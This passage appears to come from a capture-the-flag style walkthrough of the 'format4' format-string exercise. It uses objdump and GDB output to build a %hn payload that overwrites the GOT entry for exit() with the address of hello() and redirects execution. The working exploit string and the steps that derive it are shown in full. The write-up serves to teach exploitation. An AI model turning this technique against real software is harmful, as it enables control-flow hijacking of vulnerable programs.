<p>Basically, when the program is executed, the GOT (Global Offset Table) is initialized for every external functions (like <em>libc</em> functions). By doing so, the executable will cache the memory address in the GOT, so that it doesn’t have to ask <strong>libc</strong> each time an external function is called.</p>

<p>The goal here will be to overwrite the address of <em>exit()</em> in the GOT with the address of <em>hello()</em>. There are 4 steps here :</p>

<ul>
  <li>Find the address of <em>hello()</em></li>
  <li>Find the address of <em>exit()</em> in GOT</li>
  <li>Find the offset of our string on the stack</li>
  <li>Write the proper exploit string</li>
</ul>

<p>Let’s find the addresses of <em>exit()</em> and <em>hello()</em>…</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-R</span> format4

format4:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049888 R_386_GLOB_DAT    __gmon_start__
0804988c R_386_GLOB_DAT    stdin@GLIBC_2.0
0804989c R_386_JUMP_SLOT   <span class="nb">printf</span>@GLIBC_2.0
080498a0 R_386_JUMP_SLOT   _exit@GLIBC_2.0
080498a4 R_386_JUMP_SLOT   fgets@GLIBC_2.0
080498a8 R_386_JUMP_SLOT   puts@GLIBC_2.0
080498ac R_386_JUMP_SLOT   <span class="nb">exit</span>@GLIBC_2.0 <span class="c"># Address of exit()</span>
080498b0 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0


<span class="nv">$ </span>objdump <span class="nt">-t</span> format4 | <span class="nb">grep </span>hello
080484cb g     F .text	0000002e              hello
</code></pre></div></div>

<p>We have to change the value pointed by <code class="language-plaintext highlighter-rouge">080498ac</code> (<em>exit()</em>) with the address of <em>hello()</em>: <code class="language-plaintext highlighter-rouge">080484cb</code>. Now, concerning the position of our string, it’s the 4th parameters on the stack :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./format4
AAAA%08x.%08x.%08x.%08x.%08x.%08x
AAAA00000200.b7fcb5a0.08048508.41414141.78383025.3830252e
<span class="nv">$ </span>./format4
AAAA%4<span class="nv">$p</span>
AAAA0x41414141
</code></pre></div></div>

<p>Here, we’ll write <strong>080484cb</strong> in two parts, the low order bytes then, the high order bytes. Those bytes should be wrote at <strong>080498ac</strong>, the call to <em>exit()</em>. Let’s give it a try by placing a breakpoint at <em>printf()</em> :</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nb">di</span><span class="nv">sas</span> <span class="nv">vuln</span>
<span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">vuln</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x080484f9</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">ebp</span>
   <span class="err">0</span><span class="nf">x080484fa</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
   <span class="err">0</span><span class="nf">x080484fc</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">ebx</span>
   <span class="err">0</span><span class="nf">x080484fd</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x204</span>
   <span class="err">0</span><span class="nf">x08048503</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x8048400</span> <span class="o">&lt;</span><span class="nv">__x86.get_pc_thunk.bx</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x08048508</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">ebx</span><span class="p">,</span><span class="mh">0x1388</span>
   <span class="err">0</span><span class="nf">x0804850e</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x08048514</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x08048516</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x4</span>
   <span class="err">0</span><span class="nf">x08048519</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x0804851a</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="mh">0x200</span>
   <span class="err">0</span><span class="nf">x0804851f</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x208</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x08048525</span> <span class="o">&lt;+</span><span class="mi">44</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x08048526</span> <span class="o">&lt;+</span><span class="mi">45</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x8048380</span> <span class="o">&lt;</span><span class="nv">fgets@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0804852b</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="err">0</span><span class="nf">x0804852e</span> <span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x08048531</span> <span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x208</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x08048537</span> <span class="o">&lt;+</span><span class="mi">62</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x08048538</span> <span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x8048360</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span> <span class="c1">; Place the breakpoint here</span>
   <span class="err">0</span><span class="nf">x0804853d</span> <span class="o">&lt;+</span><span class="mi">68</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="err">0</span><span class="nf">x08048540</span> <span class="o">&lt;+</span><span class="mi">71</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x08048543</span> <span class="o">&lt;+</span><span class="mi">74</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="mh">0x1</span>
   <span class="err">0</span><span class="nf">x08048545</span> <span class="o">&lt;+</span><span class="mi">76</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x80483a0</span> <span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">&gt;</span>
<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">br</span> <span class="o">*</span><span class="mh">0x08048538</span>
<span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="nv">at</span> <span class="mh">0x8048538</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">run</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="nv">python</span> <span class="o">-</span><span class="nv">c</span> <span class="err">'</span><span class="nv">print</span> <span class="err">"\</span><span class="nv">xac</span><span class="err">\</span><span class="nv">x98</span><span class="err">\</span><span class="nv">x04</span><span class="err">\</span><span class="nv">x08</span><span class="o">%</span><span class="mi">4</span><span class="kc">$</span><span class="nv">n</span><span class="err">"'</span><span class="p">)</span>
<span class="nf">Starting</span> <span class="nv">program</span><span class="p">:</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">user</span><span class="o">/</span><span class="nv">demo</span><span class="o">/</span><span class="nv">format4</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="nv">python</span> <span class="o">-</span><span class="nv">c</span> <span class="err">'</span><span class="nv">print</span> <span class="err">"\</span><span class="nv">xac</span><span class="err">\</span><span class="nv">x98</span><span class="err">\</span><span class="nv">x04</span><span class="err">\</span><span class="nv">x08</span><span class="o">%</span><span class="mi">4</span><span class="kc">$</span><span class="nv">n</span><span class="err">"'</span><span class="p">)</span>

<span class="err">[----------------------------------</span><span class="nf">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<span class="nl">EAX:</span> <span class="err">0</span><span class="nf">xbffff480</span> <span class="o">--&gt;</span> <span class="mh">0x80498ac</span> <span class="o">--&gt;</span> <span class="mh">0x80483a6</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="mh">0x20</span><span class="p">)</span>
<span class="nl">EBX:</span> <span class="err">0</span><span class="nf">x8049890</span> <span class="o">--&gt;</span> <span class="mh">0x80497a0</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
<span class="nl">ECX:</span> <span class="err">0</span><span class="nf">xb7fcc87c</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="nl">EDX:</span> <span class="err">0</span><span class="nf">xbffff480</span> <span class="o">--&gt;</span> <span class="mh">0x80498ac</span> <span class="o">--&gt;</span> <span class="mh">0x80483a6</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="mh">0x20</span><span class="p">)</span>
<span class="nl">ESI:</span> <span class="err">0</span><span class="nf">x1</span> 
<span class="nl">EDI:</span> <span class="err">0</span><span class="nf">xb7fcb000</span> <span class="o">--&gt;</span> <span class="mh">0x1b2db0</span> 
<span class="nl">EBP:</span> <span class="err">0</span><span class="nf">xbffff688</span> <span class="o">--&gt;</span> <span class="mh">0xbffff698</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="nl">ESP:</span> <span class="err">0</span><span class="nf">xbffff470</span> <span class="o">--&gt;</span> <span class="mh">0xbffff480</span> <span class="o">--&gt;</span> <span class="mh">0x80498ac</span> <span class="o">--&gt;</span> <span class="mh">0x80483a6</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="mh">0x20</span><span class="p">)</span>
<span class="nl">EIP:</span> <span class="err">0</span><span class="nf">x8048538</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x8048360</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span><span class="p">)</span>
<span class="nl">EFLAGS:</span> <span class="err">0</span><span class="nf">x296</span> <span class="p">(</span><span class="nv">carry</span> <span class="nv">PARITY</span> <span class="nv">ADJUST</span> <span class="nv">zero</span> <span class="nb">SI</span><span class="nv">GN</span> <span class="nv">trap</span> <span class="nv">INTERRUPT</span> <span class="nb">di</span><span class="nv">rection</span> <span class="nv">overflow</span><span class="p">)</span>
<span class="err">[-------------------------------------</span><span class="nf">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x804852e</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x8048531</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x208</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x8048537</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">62</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
<span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x8048538</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x8048360</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x804853d</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="err">0</span><span class="nf">x8048540</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">71</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x8048543</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">74</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="mh">0x1</span>
   <span class="err">0</span><span class="nf">x8048545</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x80483a0</span> <span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">&gt;</span>
<span class="nf">Guessed</span> <span class="nv">arguments</span><span class="p">:</span>
<span class="nf">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mh">0xbffff480</span> <span class="o">--&gt;</span> <span class="mh">0x80498ac</span> <span class="o">--&gt;</span> <span class="mh">0x80483a6</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="mh">0x20</span><span class="p">)</span>
<span class="err">[------------------------------------</span><span class="nf">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="err">0000|</span> <span class="err">0</span><span class="nf">xbffff470</span> <span class="o">--&gt;</span> <span class="mh">0xbffff480</span> <span class="o">--&gt;</span> <span class="mh">0x80498ac</span> <span class="o">--&gt;</span> <span class="mh">0x80483a6</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="mh">0x20</span><span class="p">)</span>
<span class="err">0004|</span> <span class="err">0</span><span class="nf">xbffff474</span> <span class="o">--&gt;</span> <span class="mh">0x200</span> 
<span class="err">0008|</span> <span class="err">0</span><span class="nf">xbffff478</span> <span class="o">--&gt;</span> <span class="mh">0xb7fcb5a0</span> <span class="o">--&gt;</span> <span class="mh">0xfbad2088</span> 
<span class="err">0012|</span> <span class="err">0</span><span class="nf">xbffff47c</span> <span class="o">--&gt;</span> <span class="mh">0x8048508</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">15</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">ebx</span><span class="p">,</span><span class="mh">0x1388</span><span class="p">)</span>
<span class="err">0016|</span> <span class="err">0</span><span class="nf">xbffff480</span> <span class="o">--&gt;</span> <span class="mh">0x80498ac</span> <span class="o">--&gt;</span> <span class="mh">0x80483a6</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="mh">0x20</span><span class="p">)</span>
<span class="err">0020|</span> <span class="err">0</span><span class="nf">xbffff484</span> <span class="p">(</span><span class="err">"</span><span class="o">%</span><span class="mi">4</span><span class="kc">$</span><span class="nv">n</span><span class="err">\</span><span class="nv">n</span><span class="err">"</span><span class="p">)</span>
<span class="err">0024|</span> <span class="err">0</span><span class="nf">xbffff488</span> <span class="o">--&gt;</span> <span class="mh">0xbfff000a</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0028|</span> <span class="err">0</span><span class="nf">xbffff48c</span> <span class="o">--&gt;</span> <span class="mh">0xb7fdec83</span> <span class="p">(</span><span class="o">&lt;</span><span class="nb">dl</span><span class="nv">_main</span><span class="o">+</span><span class="mi">8355</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">rdtsc</span><span class="p">)</span>
<span class="err">[------------------------------------------------------------------------------]</span>
<span class="nl">Legend:</span> <span class="nf">code</span><span class="p">,</span> <span class="nv">data</span><span class="p">,</span> <span class="nv">rodata</span><span class="p">,</span> <span class="nv">value</span>

<span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08048538</span> <span class="nv">in</span> <span class="nv">vuln</span> <span class="p">()</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">x</span><span class="o">/</span><span class="nv">x</span> <span class="mh">0x080498ac</span> <span class="c1">; Check the current value</span>
<span class="err">0</span><span class="nl">x80498ac:</span>	<span class="err">0</span><span class="nf">x080483a6</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">n</span> <span class="c1">; Then step to pass printf()</span>
<span class="nf">??</span>

<span class="err">[----------------------------------</span><span class="nf">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<span class="nl">EAX:</span> <span class="err">0</span><span class="nf">x5</span> 
<span class="nl">EBX:</span> <span class="err">0</span><span class="nf">x8049890</span> <span class="o">--&gt;</span> <span class="mh">0x80497a0</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
<span class="nl">ECX:</span> <span class="err">0</span><span class="nf">x400</span> 
<span class="nl">EDX:</span> <span class="err">0</span><span class="nf">xb7fcc870</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="nl">ESI:</span> <span class="err">0</span><span class="nf">x1</span> 
<span class="nl">EDI:</span> <span class="err">0</span><span class="nf">xb7fcb000</span> <span class="o">--&gt;</span> <span class="mh">0x1b2db0</span> 
<span class="nl">EBP:</span> <span class="err">0</span><span class="nf">xbffff688</span> <span class="o">--&gt;</span> <span class="mh">0xbffff698</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="nl">ESP:</span> <span class="err">0</span><span class="nf">xbffff470</span> <span class="o">--&gt;</span> <span class="mh">0xbffff480</span> <span class="o">--&gt;</span> <span class="mh">0x80498ac</span> <span class="o">--&gt;</span> <span class="mh">0x4</span> 
<span class="nl">EIP:</span> <span class="err">0</span><span class="nf">x804853d</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
<span class="nl">EFLAGS:</span> <span class="err">0</span><span class="nf">x286</span> <span class="p">(</span><span class="nv">carry</span> <span class="nv">PARITY</span> <span class="nv">adjust</span> <span class="nv">zero</span> <span class="nb">SI</span><span class="nv">GN</span> <span class="nv">trap</span> <span class="nv">INTERRUPT</span> <span class="nb">di</span><span class="nv">rection</span> <span class="nv">overflow</span><span class="p">)</span>
<span class="err">[-------------------------------------</span><span class="nf">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x8048531</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x208</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x8048537</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">62</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x8048538</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x8048360</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
<span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x804853d</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="err">0</span><span class="nf">x8048540</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">71</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x8048543</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">74</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="mh">0x1</span>
   <span class="err">0</span><span class="nf">x8048545</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x80483a0</span> <span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x804854a</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">ecx</span><span class="p">,[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>
<span class="err">[------------------------------------</span><span class="nf">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="err">0000|</span> <span class="err">0</span><span class="nf">xbffff470</span> <span class="o">--&gt;</span> <span class="mh">0xbffff480</span> <span class="o">--&gt;</span> <span class="mh">0x80498ac</span> <span class="o">--&gt;</span> <span class="mh">0x4</span> 
<span class="err">0004|</span> <span class="err">0</span><span class="nf">xbffff474</span> <span class="o">--&gt;</span> <span class="mh">0x200</span> 
<span class="err">0008|</span> <span class="err">0</span><span class="nf">xbffff478</span> <span class="o">--&gt;</span> <span class="mh">0xb7fcb5a0</span> <span class="o">--&gt;</span> <span class="mh">0xfbad2088</span> 
<span class="err">0012|</span> <span class="err">0</span><span class="nf">xbffff47c</span> <span class="o">--&gt;</span> <span class="mh">0x8048508</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">15</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">ebx</span><span class="p">,</span><span class="mh">0x1388</span><span class="p">)</span>
<span class="err">0016|</span> <span class="err">0</span><span class="nf">xbffff480</span> <span class="o">--&gt;</span> <span class="mh">0x80498ac</span> <span class="o">--&gt;</span> <span class="mh">0x4</span> 
<span class="err">0020|</span> <span class="err">0</span><span class="nf">xbffff484</span> <span class="p">(</span><span class="err">"</span><span class="o">%</span><span class="mi">4</span><span class="kc">$</span><span class="nv">n</span><span class="err">\</span><span class="nv">n</span><span class="err">"</span><span class="p">)</span>
<span class="err">0024|</span> <span class="err">0</span><span class="nf">xbffff488</span> <span class="o">--&gt;</span> <span class="mh">0xbfff000a</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0028|</span> <span class="err">0</span><span class="nf">xbffff48c</span> <span class="o">--&gt;</span> <span class="mh">0xb7fdec83</span> <span class="p">(</span><span class="o">&lt;</span><span class="nb">dl</span><span class="nv">_main</span><span class="o">+</span><span class="mi">8355</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">rdtsc</span><span class="p">)</span>
<span class="err">[------------------------------------------------------------------------------]</span>
<span class="nl">Legend:</span> <span class="nf">code</span><span class="p">,</span> <span class="nv">data</span><span class="p">,</span> <span class="nv">rodata</span><span class="p">,</span> <span class="nv">value</span>
<span class="err">0</span><span class="nf">x0804853d</span> <span class="nv">in</span> <span class="nv">vuln</span> <span class="p">()</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">x</span><span class="o">/</span><span class="nv">x</span> <span class="mh">0x080498ac</span>
<span class="err">0</span><span class="nl">x80498ac:</span>	<span class="err">0</span><span class="nf">x00000004</span> <span class="c1">; New value, again, it's 4 because we only wrote the 4 bytes address</span>
</code></pre></div></div>

<p>So, our exploit will look like that:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">\xac\x98\x04\x08\xae\x98\x04\x08%&lt;val1&gt;x%4$hn%&lt;val2&gt;x%5$hn</code></li>
</ul>

<p>We have to figure the value based on the fact that we need to write <strong>080484cb</strong>:</p>

<ul>
  <li>Low order bytes = 84cb (33995 in decimal)</li>
  <li>High order bytes = 0804 (2052 in decimal)</li>
</ul>

<p>However, the high order bytes is inferior to the low order so, we’ll write the high order first! We just need to invert the addresses where we want to write! Let’s do some math:</p>

<ul>
  <li>High order bytes = 0804 (2052 in decimal). Minus the 8 bytes for the addresses = <strong>2044</strong></li>
  <li>Low order bytes = 84cb (33995 in decimal). Minus the 2052 bytes we already wrote = <strong>31943</strong></li>
</ul>

<p>Here is the result :</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">\xae\x98\x04\x08\xac\x98\x04\x08%2044x%4$hn%31943x%5$hn</code></li>
</ul>

<p>Now, in GDB :</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">run</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="nv">python</span> <span class="o">-</span><span class="nv">c</span> <span class="err">'</span><span class="nv">print</span> <span class="err">"\</span><span class="nv">xae</span><span class="err">\</span><span class="nv">x98</span><span class="err">\</span><span class="nv">x04</span><span class="err">\</span><span class="nv">x08</span><span class="err">\</span><span class="nv">xac</span><span class="err">\</span><span class="nv">x98</span><span class="err">\</span><span class="nv">x04</span><span class="err">\</span><span class="nv">x08</span><span class="o">%</span><span class="mi">2044</span><span class="nv">x</span><span class="o">%</span><span class="mi">4</span><span class="kc">$</span><span class="nv">hn</span><span class="o">%</span><span class="mi">31943</span><span class="nv">x</span><span class="o">%</span><span class="mi">5</span><span class="kc">$</span><span class="nv">hn</span><span class="err">"'</span><span class="p">)</span>
<span class="nf">Starting</span> <span class="nv">program</span><span class="p">:</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">user</span><span class="o">/</span><span class="nv">demo</span><span class="o">/</span><span class="nv">format4</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="nv">python</span> <span class="o">-</span><span class="nv">c</span> <span class="err">'</span><span class="nv">print</span> <span class="err">"\</span><span class="nv">xae</span><span class="err">\</span><span class="nv">x98</span><span class="err">\</span><span class="nv">x04</span><span class="err">\</span><span class="nv">x08</span><span class="err">\</span><span class="nv">xac</span><span class="err">\</span><span class="nv">x98</span><span class="err">\</span><span class="nv">x04</span><span class="err">\</span><span class="nv">x08</span><span class="o">%</span><span class="mi">2044</span><span class="nv">x</span><span class="o">%</span><span class="mi">4</span><span class="kc">$</span><span class="nv">hn</span><span class="o">%</span><span class="mi">31943</span><span class="nv">x</span><span class="o">%</span><span class="mi">5</span><span class="kc">$</span><span class="nv">hn</span><span class="err">"'</span><span class="p">)</span>
<span class="nf">??</span>                                                                                                                                    
<span class="nf">Code</span> <span class="nv">execution</span> <span class="nv">redirected</span> <span class="err">!</span>
<span class="err">[</span><span class="nf">Inferior</span> <span class="mi">1</span> <span class="p">(</span><span class="nv">process</span> <span class="mi">6884</span><span class="p">)</span> <span class="nv">exited</span> <span class="nv">with</span> <span class="nv">code</span> <span class="mi">01</span><span class="p">]</span>
<span class="nl">Warning:</span> <span class="nf">not</span> <span class="nv">running</span> <span class="nv">or</span> <span class="nv">target</span> <span class="nv">is</span> <span class="nv">remote</span>
